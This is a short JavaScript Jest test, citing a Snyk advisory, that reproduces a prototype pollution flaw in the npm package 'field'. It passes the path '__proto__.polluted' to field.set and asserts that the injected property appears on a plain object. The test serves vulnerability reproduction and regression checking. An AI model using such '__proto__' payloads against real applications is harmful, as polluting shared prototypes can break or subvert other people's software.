//https://snyk.io/vuln/SNYK-JS-FIELD-1039884
test("prototype pollution in field ", () => {
  expect({}.polluted).toBe(undefined);

  const field = require("field");
  const obj = {};
  field.set(obj, "__proto__.polluted", "yes");

  expect(obj.polluted).toBe("yes");
});
